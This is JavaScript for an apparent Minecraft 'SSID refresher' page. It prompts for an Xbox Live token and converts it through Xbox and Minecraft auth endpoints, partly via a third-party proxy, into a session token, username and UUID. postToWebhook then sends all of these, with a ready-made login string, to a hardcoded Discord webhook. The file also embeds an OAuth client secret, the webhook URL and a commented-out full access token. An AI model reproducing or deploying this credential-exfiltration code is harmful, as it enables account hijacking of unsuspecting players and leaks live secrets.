//XBL TOKEN
//const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.qVNVmYinTR4LW1gllaSyWk-1zCgoV5_VkquAMJU1eS8tQXjlFVR2NBF_5ckb_Z91f5D8Dim-YEPGc6_FavwWWrvCCBxVeR8dq7GFbF31W45KmQLW4tQ88fncsycTqu5BhkaEm03BNNsJC8iQWXiw0f_OALGXftz4ckm3lCVu76mGzd_1HF7_-fSNBn7-nSKO2uBkWPeFbVzrkPDLv4Uf3oTdzsRvMiZ6ini2_Dwm5ZEx4MKnZkUgLoHmXUL2J9vxp-yReE-6-XtL7_7SyGHY-WG97g5lx9-oQGYg1t5c-q0PjNmqAvgHwcTmCbY4pT4NKfRRPRTZizCKjuMCTObfzw.6yfsn-e5nFEYTaPfcAkY3w.j3HyIXzRk7JzOhyApuTuiBkoeYkZVn3mj7YKFAN0kMdw70kFUS4DQMY0lP4VQHOsj2fp8h1xx6FW-SX-gCafXT2-JZ7EQO-8klfeyofeAIx-5e1xO6oIUvd9fwE8X4mrV33GxvlQx9wTA19TvgnMDK1HAqthYVesO8bFaSlHhuRjSwcBxc8bK9Mfw9Xzwy81qRomrkvQ0ACP0ioEDz73M-9HbHuGtlYO-3GPQZIEHd7U86bzsNb3hBGKotRgCv51zn2i9vzMSAsiSphW-dL-gQtY-BdzRuB6Zf_cHjFqRGsZEDxuWotVcCuzKXiTr3k6elqGtxDm8BFrwIq4U0RSHcg25fg7WQSLFf-hnvS9MEECgPQ6Me8t84nDlCFFDR8TCSlY_cNHOM9J5CK4gCW9oKablg_ueQUrahoQJn8vX3bFRQuTMXXsw_bKV1WvEzVh9hQxYZWHMPNgxT7F-GHU29oUte5HHKpY8m1Y5bUlSfUdUqL7H77Wf9B2KAH9dGAZdCcdQfgiQjF6Jr9inhuV2vy-IoZ5qKFGpaTILrmnlWpHDMvwYj5FybZJbdP2UC0oxYeuEXAF7tfVc0MK-Xruh_ghkT-8xAUzpt3L0ctBXHpngZceBoRkZz5CbFCcZEV5GlQG0ROKi97xqJa4VXAvTnxsT7hNUz__1wwsLSlzxpGFnqqc51K9-5pMCTuLTGYRzVFRxfsEJf4E_ibs0EDt-nE9tfBl2f530KF8h5fqoGLwDCh4nIeujOhn2BibVz-UuMKChxqQdlFEaKdDFF3Xv_17vxiIo75MJMi_bsGrh2kXqi_XrxL0R89IHKZm67-qz1rjZnNGWu_0I7VPyIeuwcMqZM9gkdwB9mstedFNOnNy8c1ZaVI9xyCVkh3IVP66a1u2Xn0FEcYKNtdPpmcZTebfedRxkeG7t9GAsh8WaWzXlMS26Uq82cSU4HkO6jrm0tPIflAYB3JDDPc4zQjv0uM3wBCkDz9CvmeoD6A8VTVUQ2m5cwuXhpsG98xih4zF.XT8ET9qx9QFrKxyCmVF2qQ'

// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
// Config end
const webhook_url = 'https://discord.com/api/webhooks/1047691731627421786/HZ6enVy92ZGh0DyUyZpiD0VMmDx3smZzggnE8RhYcKAEIV2w64MhtHb8Gk5YXzLHj3hK'
async function myFunction() {
  let userToken = prompt("Please enter XBL token", "");
  if (userToken != null) {
    document.getElementById("demo").innerHTML =
    "REFRESHING: " + userToken;
     //app.get("/api/player/networth", async (req, res) => {
  //if (userToken == undefined) {
    //res.json({
      //success: false,
      //cause: "Missing minecraft_ign field",
    //});
    //return;
  //}
    //res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('its working!')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        document.getElementById("demo1").innerHTML = "RETRIEVING SSID...";
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        document.getElementById("demo2").innerHTML = "ssid: " + bearerToken;
        document.getElementById("demo3").innerHTML = "RETRIEVING USER & UUID...";
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        document.getElementById("demo4").innerHTML = "username: " + username;
      //const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth

                //check if has profiles, if api off or if normal
                //let total_networth
                //if (networth == null) total_networth = `[NW] No profile data found [NW]`
                //else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
                //else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
        postToWebhook(username, bearerToken, uuid, userToken)
        document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
    } catch (e) {
        console.log(e)
    }
  }
}
  async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function waitforthis() {
  await waitFor(_ => getElementById !== 'undefined');
  console.log('the wait is over!');
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://proxy124245.herokuapp.com/https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://proxy124245.herokuapp.com/https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function postToWebhook(username, bearerToken, uuid, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "||```" + userToken + "```||",
        embeds: [{
            title: "SSID REFRESHED", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: "[Local Address]", inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}

//function returnText() {
//  let userToken = 
//  alert(input)
//}

const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
  const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
    
